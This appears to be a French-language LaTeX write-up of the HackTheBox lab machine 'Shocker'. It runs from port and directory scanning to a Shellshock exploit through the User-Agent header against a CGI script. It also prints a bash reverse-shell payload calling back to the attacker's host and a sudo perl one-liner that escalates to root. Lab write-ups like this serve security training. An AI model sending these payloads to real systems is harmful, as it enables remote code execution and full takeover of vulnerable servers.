\chapter{Shocker}
\begin{itemize}
    \item {\bf technics}: icgi-bin shellshock, perl privesc
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Recon}
\subsection{nmap}
\begin{verbatim}
TARGET_IP=10.10.10.56
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
$ sudo nmap -sVC -p$PORTS $TARGET_IP

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4f8ade8f80477decf150d630a187e49 (RSA)
|   256 228fb197bf0f1708fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f1123c34a55d5beb3de9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

\end{verbatim}


on ne trouve pas grand chose en premiere intention donc on passe Ã 
\begin{verbatim}
$ ffuf -u http://10.10.10.56/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -mc all -fl 10

.hta                    [Status: 403, Size: 290, Words: 22, Lines: 12, Duration: 47ms]
.htaccess               [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 29ms]
.htpasswd               [Status: 403, Size: 295, Words: 22, Lines: 12, Duration: 30ms]
cgi-bin/                [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 28ms]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12, Duration: 27ms]


$$ ffuf -u http://10.10.10.56/cgi-bin/FUZZ \
    -w /usr/share/seclists/Discovery/Web-Content/common.txt \
    -e .sh,.cgi,.pl,.py \
    -mc all -fl 10

.hta                    [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 26ms]
.hta.sh                 [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 26ms]
.hta.pl                 [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 44ms]
.hta.cgi                [Status: 403, Size: 302, Words: 22, Lines: 12, Duration: 44ms]
.htaccess               [Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 44ms]
.htaccess.sh            [Status: 403, Size: 306, Words: 22, Lines: 12, Duration: 44ms]
.hta.py-mc              [Status: 403, Size: 304, Words: 22, Lines: 12, Duration: 44ms]
.htaccess.cgi           [Status: 403, Size: 307, Words: 22, Lines: 12, Duration: 45ms]
.htaccess.pl            [Status: 403, Size: 306, Words: 22, Lines: 12, Duration: 45ms]
.htaccess.py-mc         [Status: 403, Size: 309, Words: 22, Lines: 12, Duration: 45ms]
.htpasswd.sh            [Status: 403, Size: 306, Words: 22, Lines: 12, Duration: 28ms]
.htpasswd               [Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 28ms]
.htpasswd.pl            [Status: 403, Size: 306, Words: 22, Lines: 12, Duration: 27ms]
.htpasswd.cgi           [Status: 403, Size: 307, Words: 22, Lines: 12, Duration: 29ms]
.htpasswd.py-mc         [Status: 403, Size: 309, Words: 22, Lines: 12, Duration: 30ms]
user.sh                 [Status: 200, Size: 119, Words: 19, Lines: 8, Duration: 44ms]

i$ curl -i http://10.10.10.56/cgi-bin/user.sh
HTTP/1.1 200 OK
Date: Thu, 19 Jan 2023 15:40:23 GMT
Server: Apache/2.4.18 (Ubuntu)
Transfer-Encoding: chunked
Content-Type: text/x-sh

Content-Type: text/plain

Just an uptime test script

 10:40:23 up 20 min,  0 users,  load average: 0.07, 0.21, 0.17
\end{verbatim}

en cherchant cgi exploit on tombe sur 
\url{https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi}
qui parle de shellshock.


\begin{verbatim}
$ sudo nmap 10.10.10.56 -p80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-19 16:44 CET
Nmap scan report for 10.10.10.56
Host is up (0.049s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock:
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|       http://www.openwall.com/lists/oss-security/2014/09/24/10
|       http://seclists.org/oss-sec/2014/q3/685
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271

Nmap done: 1 IP address (1 host up) scanned in 7.50 seconds
\end{verbatim}

donc en lisant le script de nmap on peut reproduire et valider que c'est le
header \verb+User-Agent+

\begin{verbatim}
$ curl -i -H "User-agent: () { :;}; echo; echo -n titi; echo toto" \
    http://10.10.10.56/cgi-bin/user.sh
HTTP/1.1 200 OK
Date: Thu, 19 Jan 2023 16:00:05 GMT
Server: Apache/2.4.18 (Ubuntu)
Transfer-Encoding: chunked
Content-Type: text/x-sh

tititoto

Content-Type: text/plain

Just an uptime test script

 11:00:05 up 39 min,  0 users,  load average: 0.00, 0.00, 0.02

\end{verbatim}

on continue
\begin{verbatim}
$ curl -i -H "User-agent: () { :;}; /bin/ping -c 10 10.10.16.6" http://10.10.10.56/cgi-bin/user.sh
$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:02:03.558699 IP 10.10.10.56 > honbu: ICMP echo request, id 1511, seq 1, length 64
17:02:03.558745 IP honbu > 10.10.10.56: ICMP echo reply, id 1511, seq 1, length 64
17:02:04.491345 IP 10.10.10.56 > honbu: ICMP echo request, id 1511, seq 2, length 64
\end{verbatim}


\section{foothold}

\subsection{shelly}
\begin{verbatim}
$ curl -i \
    -H 'User-agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.16.6/4444 0>&1' \
    http://10.10.10.56/cgi-bin/user.sh
$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.10.56 39920
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ id
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
shelly@Shocker:/usr/lib/cgi-bin$

$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/home/shelly$

$ sudo /usr/bin/perl -e 'exec "/bin/sh"'
sudo /usr/bin/perl -e 'exec "/bin/sh"'
id
uid=0(root) gid=0(root) groups=0(root)

\end{verbatim}
